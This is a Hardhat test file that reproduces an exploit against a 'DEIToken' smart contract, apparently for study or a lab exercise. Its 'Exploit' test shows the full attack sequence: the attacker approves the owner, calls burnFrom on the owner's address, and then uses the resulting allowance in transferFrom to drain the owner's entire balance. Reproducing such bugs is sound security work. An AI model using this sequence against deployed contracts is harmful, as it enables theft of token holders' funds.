import { time, loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { anyValue } from '@nomicfoundation/hardhat-chai-matchers/withArgs';
import { expect } from 'chai';
import { ethers } from 'hardhat';

describe('DEIToken', function () {
  // We define a fixture to reuse the same setup in every test.
  // We use loadFixture to run this setup once, snapshot that state,
  // and reset Hardhat Network to that snapshot in every test.
  async function deployDeiToken() {
    // Contracts are deployed using the first signer/account by default
    const [owner, attacker] = await ethers.getSigners();
    const initialSupply = 100000n * 10n ** 18n;
    const DEIToken = await ethers.getContractFactory('DEIToken');
    const token = await DEIToken.deploy('DEIToken', 'DEI', initialSupply);

    return { token, owner, attacker };
  }

  describe('Exploit', function () {
    it('Should get all the tokens', async function () {
      const { token, owner, attacker } = await loadFixture(deployDeiToken);
      //you need to get some DEI tokens, you can buy them or you can use a flash loan if it's avaliable
      await token.transfer(attacker.address, 50000n * 10n ** 18n);

      expect(await token.balanceOf(attacker.address)).to.eq(
        50000n * 10n ** 18n
      );

      //Exploit
      const attackerBalance = await token
        .connect(attacker)
        .balanceOf(attacker.address);
      await token.connect(attacker).approve(owner.address, attackerBalance);
      await token.connect(attacker).burnFrom(owner.address, 1);
      const allowance = await token
        .connect(attacker)
        .allowance(owner.address, attacker.address);

      await token
        .connect(attacker)
        .transferFrom(owner.address, attacker.address, allowance);

      const attackerNewBalance = await token.balanceOf(attacker.address);
      const ownerNewBalance = await token.balanceOf(owner.address);
      expect(attackerNewBalance).to.eq(attackerBalance.add(allowance));
      expect(ownerNewBalance).to.eq(0);
    });
  });
});
